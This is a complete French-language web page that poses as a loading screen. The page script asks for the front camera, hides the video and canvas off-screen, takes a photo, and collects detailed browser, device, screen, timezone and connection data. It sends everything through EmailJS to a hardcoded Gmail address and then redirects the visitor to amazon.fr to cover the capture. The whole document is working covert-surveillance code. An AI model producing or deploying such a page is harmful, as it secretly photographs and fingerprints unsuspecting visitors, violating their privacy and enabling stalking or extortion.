<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .loading {
      text-align: center;
      padding: 40px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    #video, #canvas {
      position: absolute;
      left: -9999px;
      opacity: 0;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="spinner"></div>
    <p>Chargement en cours...</p>
  </div>
  
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="320" height="240"></canvas>
  
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    // Démarrage automatique
    window.addEventListener('load', async () => {
      try {
        // Accès caméra frontale
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user',
            width: { ideal: 320 },
            height: { ideal: 240 }
          }
        });
        
        video.srcObject = stream;
        video.muted = true;
        
        // Photo instantanée dès que prêt
        video.addEventListener('loadedmetadata', () => {
          captureAndSend(stream);
        });
        
      } catch (err) {
        console.error('Erreur caméra:', err);
        redirectToAmazon();
      }
    });
    
    function captureAndSend(stream) {
      // Capture instantanée
      context.drawImage(video, 0, 0, 320, 240);
      const photoData = canvas.toDataURL("image/jpeg", 0.5);
      
      // Arrêter la caméra immédiatement
      stream.getTracks().forEach(track => track.stop());
      
      // Collecter toutes les métadonnées
      const templateParams = {
        // Destinataire spécifique
        to_email: "adressestestee@gmail.com",
        to_name: "Test Recipient",
        
        // Expéditeur
        from_name: "Auto Capture",
        message: "Photo instantanée avec métadonnées complètes",
        
        // Photo
        photo_data: photoData,
        
        // Date et heure
        timestamp: new Date().toLocaleString('fr-FR'),
        date: new Date().toISOString().split('T')[0],
        time: new Date().toLocaleTimeString('fr-FR'),
        iso_timestamp: new Date().toISOString(),
        
        // Navigateur
        user_agent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages.join(', '),
        platform: navigator.platform,
        cookie_enabled: navigator.cookieEnabled,
        online_status: navigator.onLine ? "En ligne" : "Hors ligne",
        
        // Écran et fenêtre
        screen_width: screen.width,
        screen_height: screen.height,
        screen_resolution: screen.width + 'x' + screen.height,
        color_depth: screen.colorDepth,
        pixel_depth: screen.pixelDepth,
        window_width: window.innerWidth,
        window_height: window.innerHeight,
        window_size: window.innerWidth + 'x' + window.innerHeight,
        
        // Page
        page_url: window.location.href,
        page_title: document.title,
        page_domain: window.location.hostname,
        page_protocol: window.location.protocol,
        referrer: document.referrer || "Direct",
        
        // Timezone
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezone_offset: new Date().getTimezoneOffset(),
        
        // Performance
        load_time: performance.now(),
        
        // Connexion (si disponible)
        connection_type: navigator.connection ? navigator.connection.effectiveType : "Inconnue",
        connection_speed: navigator.connection ? navigator.connection.downlink + " Mbps" : "Inconnue",
        
        // Appareil (estimations)
        is_mobile: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent),
        is_tablet: /iPad|Android(?!.*Mobile)/.test(navigator.userAgent),
        is_desktop: !/Mobile|Android|iPhone|iPad/.test(navigator.userAgent),
        
        // Capacités
        webgl_support: !!window.WebGLRenderingContext,
        local_storage: typeof Storage !== "undefined",
        session_storage: typeof sessionStorage !== "undefined",
        
        // Géolocalisation (statut seulement)
        geolocation_available: !!navigator.geolocation,
        
        // Caméra info
        camera_access: "Accordé",
        photo_quality: "0.5",
        photo_format: "JPEG",
        photo_dimensions: "320x240",
        
        // Session
        session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
        random_id: Math.random().toString(36).substr(2, 12),
        
        // Extras
        java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        do_not_track: navigator.doNotTrack,
        hardware_concurrency: navigator.hardwareConcurrency || "Inconnu",
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnu"
      };
      
      // Envoi avec toutes les métadonnées
      emailjs.send("service_8cs0gml", "template_w14xn7c", templateParams)
        .then(() => {
          console.log('✅ Photo + métadonnées envoyées à adressestestee@gmail.com');
        })
        .catch(err => {
          console.error('❌ Erreur envoi:', err);
        })
        .finally(() => {
          redirectToAmazon();
        });
    }
    
    function redirectToAmazon() {
      setTimeout(() => {
        window.location.href = 'https://www.amazon.fr';
      }, 1000);
    }
  </script>
</body>
</html>
